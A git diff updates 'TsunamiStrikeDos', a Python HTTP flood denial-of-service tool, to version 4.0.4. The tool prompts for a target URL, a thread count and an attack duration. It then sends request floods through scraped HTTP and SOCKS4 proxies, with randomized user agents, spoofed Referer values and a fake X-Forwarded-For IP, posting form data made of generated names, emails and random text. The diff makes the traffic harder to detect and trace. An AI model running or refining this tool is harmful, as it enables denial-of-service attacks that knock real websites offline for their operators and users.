@@ -12,10 +12,17 @@ from colorama import Fore as F
 from requests.exceptions import ConnectionError, Timeout
 from fake_useragent import UserAgent
 import os
+from halo import Halo
+
+
 
 os.system('clear')
-
+__version__ = '4.0.4'
+__method__ = 'HTTP'
+#  
 # --------------------------------------
+
+sip = Halo()
 
 print(f'''
 {F.GREEN}
@@ -25,11 +32,13 @@ print(f'''
 ⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣏⣛⣛⣉⣛⡛⠋⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢿⣿⣿⣿⠟⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-                {F.CYAN} TsunamiStrikeDos V{F.GREEN} 3.2.5{F.RESET}
+                {F.CYAN} TsunamiStrikeDos V{F.GREEN} {__version__}{F.RESET}
+
 ''')
+print('_'*40)
 
 # -------------------------------------------
-
+sip.succeed(f'Method: {__method__}')
 fake = faker.Faker()
 
 def emailCreateFake():
@@ -42,14 +51,21 @@ def emailCreateFake():
     email = email_1 + ranListMe
     return email
 
+
+def buildBlock(size):
+
+    block = ''.join(random.choice(string.ascii_letters) for _ in range(size))
+    return block
+
 def dataRandom():
     return {
-        'name': ''.join(random.choices(string.ascii_letters, k=700)),
-        'message': ''.join(random.choices(string.ascii_letters + string.digits + "~!@#$%^&*()", k=7000)),
+        'name': fake.name(),
+        'message': buildBlock(random.randint(50,80))+'='+buildBlock(random.randint(50,80)),
         'email': emailCreateFake()
     }
 
 warnings.filterwarnings("ignore", message="Unverified HTTPS request")
+
 
 def get_http_proxies() -> List[Dict[str, str]]:
     """Return a list of available proxies from both HTTP and SOCKS4."""
@@ -97,13 +113,13 @@ def generate_headers():
     """Generate more advanced headers to mimic real requests."""
     return {
         "User-Agent": ua.random,  # Use random User-Agent
-        "X-Requested-With": "XMLHttpRequest",
+        "X-Requested-With": random.choice(["XMLHttpRequest", "FetchRequest"]),
         "Connection": "keep-alive",
         "Pragma": "no-cache",
         "Cache-Control": "no-cache",
         "Accept-Encoding": "gzip, deflate, br",
         "Accept-Language": "en-US,en;q=0.9",
-        "Referer": random.choice(["https://www.google.com", "https://www.bing.com", "https://www.yahoo.com"]),
+        "Referer": random.choice(["https://www.google.com", "https://www.bing.com", "https://www.yahoo.com", "https://www.youtube.com","https://www.instagram.com", "https://www.facebook.com/"]),
         "DNT": "1",  # Do Not Track header
         "Upgrade-Insecure-Requests": "1",  # Common in browser requests
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
@@ -111,6 +127,7 @@ def generate_headers():
         "Sec-Fetch-Site": "same-origin",
         "Sec-Fetch-User": "?1",
         "Sec-Fetch-Dest": "document",
+        "X-Forwarded-For": fake.ipv4()
     }
 
 def flood(target: str) -> None:
@@ -128,7 +145,8 @@ def flood(target: str) -> None:
             status = f"{F.GREEN if response.status_code == 200 else F.RED}({response.status_code}){F.RESET}"
             payload_size = f"{F.GREEN} Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
             proxy_addr = f"| {F.GREEN}Proxy: {F.CYAN}{proxy['http']:>21}"
-            print(f"{status} Request Sent!{F.RESET} --> {payload_size} {F.RESET}{proxy_addr}{F.RESET}")
+            ip_fake = f"IP: {headers['X-Forwarded-For']}"
+            print(f"{status}:Request Sent! --> {payload_size} {F.RESET}{proxy_addr}{F.RESET}")
             if response.status_code != 200:
                 try:
                     proxies.remove(proxy)
@@ -144,13 +162,14 @@ def start_flooding(target: str, thread_count: int, duration: int) -> None:
         thread.start()
 
     while time.time() < stop_time:
-        time.sleep(1)  # Keep the main thread alive until duration ends
+        time.sleep(duration)  # Keep the main thread alive until duration ends
 
-    print(f"\n{F.CYAN}[i] {F.GREEN}Flooding finished after {duration} seconds.{F.RESET}")
+    print(f"\n{F.CYAN}( DONE ) {F.GREEN}Attac finished after {duration} seconds.{F.RESET}")
 
 if __name__ == "__main__":
-    target_url = input(f"{F.CYAN}[?]{F.RESET} target URL: {F.GREEN}")
-    num_threads = int(input(f"{F.CYAN}[?]{F.RESET} threads: {F.GREEN}"))
-    duration = int(input(f"{F.CYAN}[?]{F.RESET} attack duration (seconds): {F.GREEN}"))
+    target_url = input(f"{F.CYAN}(?){F.RESET} target URL: {F.GREEN}")
+    num_threads = int(input(f"{F.CYAN}(?){F.RESET} threads: {F.GREEN}"))
+    duration = int(input(f"{F.CYAN}(?){F.RESET} attack duration (seconds): {F.GREEN}"))
 
     start_flooding(target_url, num_threads, duration)
+
